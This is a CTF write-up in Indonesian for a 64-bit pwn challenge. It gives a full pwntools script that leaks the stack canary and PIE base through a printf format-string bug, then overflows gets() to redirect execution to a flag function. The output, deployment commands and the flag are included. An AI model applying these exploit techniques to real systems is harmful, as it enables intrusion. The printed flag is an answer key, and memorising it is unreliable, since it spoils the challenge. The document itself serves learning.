# How (264 Pts)

## Deskripsi
Apakah kamu tahu bagaimana caranya?

Author : **Inlandsche**

## Hint 
Tidak ada

## Proof of Concept
Pertama, lakukan analisa kode program dengan menggunakan software disassambler (`ghidra/IDA`) atau dengan `gdb`.
Program memiliki kelemahan pada fungsi `printf()` dan `gets()` sehingga dapat dilakukan overflow.

Pada program ini, terdapat proteksi dengan CANARY dan PIE. Kita bisa memanfaatkan kelemahan `printf()` untuk mendapatkannya. Untuk mendapatkan CANARY dan base address, kita harus memahami fungsi `strcspn()` pada bahasa C. Pada soal ini terdapat kondisi jika `strcspn()` sama dengan 40, maka program akan mengeluarkan fungsi `printf()` dan address dari fungsi `program()` sehingga kita bisa mendapatkan CANARY dan base address.


Script python untuk menyelesaikannya

```
from pwn import *

elf = ELF('./how')
p = elf.process()

# strcspn dan mendapatkan canary
inp = b"x"*40 + b"Q %47$p"

p.sendline(inp)
p.recvuntil(b"Hi, how was your day? xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxQ ")

canary = int(p.recvline().rstrip(), 16)
log.info("Canary found: [%s]", hex(canary))

p.recvuntil(b"You got the program address ")

program_addr = int(p.recvline().rstrip(), 16)
log.info("Address of program() found: [%s]", hex(program_addr))

base = program_addr - elf.symbols['program']
log.info("Base address found: [%s]", hex(base))

# Payload
canary_offset = 264

# address pemanggilan flag didapatkan dari disassamble fungsi program()
flaggg = 0x0000000000001297

payload = b"x"*canary_offset
payload += p64(canary)

# mengisi RBP dengan sembarang input
payload += b"RRBBBBPP"
# merubah return address untuk memanggil fungsi pemanggilan flag
payload += p64(flaggg + base)

p.sendline(payload)
p.interactive()
```

Output dari script tersebut

```
[*] '/home/inlandsche/CySec/Hology/Hology Soal/Soal 2/how'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[x] Starting local process '/home/inlandsche/CySec/Hology/Hology Soal/Soal 2/how'
[+] Starting local process '/home/inlandsche/CySec/Hology/Hology Soal/Soal 2/how': pid 8260
[*] Canary found: [0x5132475db3b2c200]
[*] Address of program() found: [0x55b43c5361b9]
[*] Base address found: [0x55b43c535000]
[*] Switching to interactive mode
Do you wanna say something?
>> Thanks :)
hology4{strcspn_4d4Lah_k0eNtJ1}
[*] Process '/home/inlandsche/CySec/Hology/Hology Soal/Soal 2/how' stopped with exit code 0 (pid 8260)
[*] Got EOF while reading in interactive
```

## Referensi
Soal iFest (wangy), Soal Hacktivity (retcheck)

## Deployment

```
docker build -t how .
docker run -dp 37013:37013 --name how how
crontab /path/to/crontab
```

## Flag
<details>
<summary>Tekan untuk melihat flag</summary>

    hology4{strcspn_4d4Lah_k0eNtJ1}

</details>